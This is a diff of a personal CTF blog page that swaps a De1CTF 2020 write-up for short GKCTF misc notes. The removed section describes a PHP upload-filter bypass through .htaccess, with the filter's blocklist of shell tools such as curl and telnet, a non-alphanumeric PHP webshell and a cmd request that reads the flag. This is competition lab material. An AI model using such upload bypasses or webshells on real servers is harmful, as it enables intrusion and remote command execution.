@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="De1CTF 2020 WP, Web,CTF,Misc,JS,Python">
+    <meta name="keywords" content="GKCTF复现, Web,CTF,Misc,JS,Python">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>De1CTF 2020 WP | V1cuna&#39;s blog</title>
+    <title>GKCTF复现 | V1cuna&#39;s blog</title>
     <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/V1cuna.png">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/libs/awesome/css/all.css">
@@ -308,12 +308,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/6.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/4.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">De1CTF 2020 WP</h1>
+                    <h1 class="description center-align post-title">GKCTF复现</h1>
                 </div>
             </div>
         </div>
@@ -430,12 +430,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
-                            </a>
-                        
-                            <a href="/tags/WP/">
-                                <span class="chip bg-color">WP</span>
+                            <a href="/tags/CTF-WP/">
+                                <span class="chip bg-color">-CTF -WP</span>
                             </a>
                         
                     </div>
@@ -450,7 +446,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-05-06
+                    2020-05-31
                 </div>
                 
 
@@ -459,7 +455,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    639
+                    129
                 </div>
                 
 
@@ -476,65 +472,12 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>这次队伍最后排了82名，继续加油哇。</p>
-<p>做的题有点少，有机会慢慢复现</p>
-<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="CheckIN"><a href="#CheckIN" class="headerlink" title="CheckIN"></a>CheckIN</h2><p>一个文件上传的题。</p>
-<pre><code>Server: Apache2.4.6 (CentOS) PHP/5.4.16
-X-Powered-By: PHP/5.4.16</code></pre><p>用户文件上传到: <code>/uploads/[md5(REMOTE_ADDR)]/</code>而所有发送的内容都是通过以下过滤器来完成的：</p>
-<pre><code class="php">$black = file_get_contents($tmp_name);
-if (!$tmp_name) {
-    $result1 ="???";
-}else if (!$name) {
-    $result1 ="filename cannot be empty!";
-}
-else if (preg_match("/ph|ml|js|cg/i", $name)) {
-    $result1 = "filename error";
-}
-else if (!in_array($_FILES["fileUpload"]['type'], $typeAccepted)) {
-    $result1 = 'filetype error';
-}
-else if (preg_match("/perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet/i",$black)){
-    $result1 = "perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents!";
-}</code></pre>
-<p>发现可以上传.htaccess来绕过，并且由于支持多行语句执行（短命令），就比如说：</p>
-<pre><code>AddHandler application/x-httpd-p\
-hp .aaa</code></pre><p>基本思路有了，现在问题是<code>&lt;?php</code>标签，短标签<code>&lt;=</code>也不行。</p>
-<p>注意到前面apache和php，我们知道可以利用apache和mod_php，通过.htaccess来修改php.ini的指令</p>
-<pre><code>AddHandler application/x-httpd-p\
-hp .aaa
-
-p\
-hp_value short_open_tag 1</code></pre><p>那么我们就能把aaa扩展当做php来执行，最后上马或者直接读取就可以</p>
-<pre><code>/uploads/xxxxxxxxx/check.aaa?cmd=cat%20/flag</code></pre><p>flag：<code>De1ctf{cG1_cG1_cg1_857_857_cgll111ll11lll}</code></p>
-<h2 id="Hard-Pentest-1"><a href="#Hard-Pentest-1" class="headerlink" title="Hard_Pentest_1"></a>Hard_Pentest_1</h2><p>一开始单纯的以为是P神的无字母数字webshell。。。后来发现分号也GG了</p>
-<p>绕过：php的标签，这个用短标签就可以</p>
-<pre><code class="php">&lt;?= a ?&gt; 
-&lt;?php echo $a ?&gt;</code></pre>
-<pre><code class="php">&lt;?= $_=[] ?&gt; 
-&lt;?= $_=@"$_" #Array ?&gt;
-&lt;?= $_=$_[('!'=='@')] #('!'=='@') results in 0 ?&gt;
-
-&lt;?= $__ = $_ ?&gt;
-&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ + $__++ + $__++#G ?&gt;
-&lt;?= $_______ = "_".$__ #_G ?&gt;
-
-&lt;?= $__ = $_ ?&gt;
-&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ #E ?&gt;
-&lt;?= $_______ .= $__ #_GE ?&gt;
-
-&lt;?= $__ = $_ ?&gt;
-&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ #T ?&gt;
-&lt;?= $_______ .= $__ #_GET ?&gt;
-
-&lt;?= ${$_______}["_"](${$_______}["__"]) # $_GET['_']($_GET['__']) ?&gt;</code></pre>
-<p>webshell如图，最后<code>?_=system&amp;__=ls</code></p>
-<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="大杂烩"><a href="#大杂烩" class="headerlink" title="大杂烩"></a>大杂烩</h2><p>给了一个pcap，按照大小追踪HTTP流</p>
-<p><img src="https://i.loli.net/2020/05/13/8Oj64XLEIPSDpgw.jpg" alt="Snipaste_2020-05-06_13-12-13.jpg"></p>
-<p>把png提取出来（可以直接复制hex码），发现是一个网盘的url，下载。</p>
-<p>windows打不开这个憨憨word文档，改为rar成功拿到压缩包，爆破出密码DE34Q1。</p>
-<p>图片binwalk，一开始虚拟机出了点问题，同学给我的压缩包不全。。。但是自己binwalk出的包就能看出ntfs流。。。555提取出来就好了</p>
-<h2 id="MC-Join"><a href="#MC-Join" class="headerlink" title="MC_Join"></a>MC_Join</h2><p>脚本和Nu1L师傅们的差不多<a href="https://wx.zsxq.com/dweb2/index/group/824215518412，可读性太差了。。。。直接看他们的把" target="_blank" rel="noopener">https://wx.zsxq.com/dweb2/index/group/824215518412，可读性太差了。。。。直接看他们的把</a></p>
-<script>
+                <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="GKCTF2020-Pokémon"><a href="#GKCTF2020-Pokémon" class="headerlink" title="[GKCTF2020]Pokémon"></a>[GKCTF2020]Pokémon</h3><p>这个gba模拟器打开开金手指就可以了</p>
+<h3 id="GKCTF2020-code-obfuscation"><a href="#GKCTF2020-code-obfuscation" class="headerlink" title="[GKCTF2020]code obfuscation"></a>[GKCTF2020]code obfuscation</h3><p>HXD分析图片，binwalk得到压缩包，有密码，非伪加密。</p>
+<p>倾斜的二维码，用PS调正，粗糙修复，扫码得到base(gkctf)</p>
+<p>试出来是base58，当做压缩包密码</p>
+<p>发现一个js</p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -577,7 +520,7 @@ hp_value short_open_tag 1</code></pre><p>那么我们就能把aaa扩展当做php
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://hackyangtuo.top/posts/undefined.html">https://hackyangtuo.top/posts/undefined.html</a>
+                    <a href="https://hackyangtuo.top/posts/1fa2.html">https://hackyangtuo.top/posts/1fa2.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -615,12 +558,8 @@ hp_value short_open_tag 1</code></pre><p>那么我们就能把aaa扩展当做php
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
-                                </a>
-                            
-                                <a href="/tags/WP/">
-                                    <span class="chip bg-color">WP</span>
+                                <a href="/tags/CTF-WP/">
+                                    <span class="chip bg-color">-CTF -WP</span>
                                 </a>
                             
                         </div>
@@ -662,9 +601,58 @@ hp_value short_open_tag 1</code></pre><p>那么我们就能把aaa扩展当做php
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/posts/1fa2.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/4.jpg" class="responsive-img" alt="GKCTF复现">
+                        
+                        <span class="card-title">GKCTF复现</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            WebMisc[GKCTF2020]Pokémon这个gba模拟器打开开金手指就可以了
+[GKCTF2020]code obfuscationHXD分析图片，binwalk得到压缩包，有密码，非伪加密。
+倾斜的二维码，用PS调正，粗糙修复
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-31
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            V1cuna
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF-WP/">
+                        <span class="chip bg-color">-CTF -WP</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/posts/ccdc.html">
                     <div class="card-image">
@@ -684,9 +672,9 @@ hp_value short_open_tag 1</code></pre><p>那么我们就能把aaa扩展当做php
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-05-29
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-29
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -708,57 +696,6 @@ hp_value short_open_tag 1</code></pre><p>那么我们就能把aaa扩展当做php
                     
                     <a href="/tags/BUU/">
                         <span class="chip bg-color">BUU</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/posts/4c15.html">
-                    <div class="card-image">
-                        
-                        
-                        <img src="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/0.jpg" class="responsive-img" alt="GXYCTF2019重做">
-                        
-                        <span class="card-title">GXYCTF2019重做</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            Webpingpingping在昨天的https://www.hackyangtuo.top/posts/ab7.html#toc-heading-1写过了
-禁止套娃考察：git源码泄露，无参数RCE                
-啥都没
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-06
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            V1cuna
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
-                    <a href="/tags/WP/">
-                        <span class="chip bg-color">WP</span>
                     </a>
                     
                 </div>
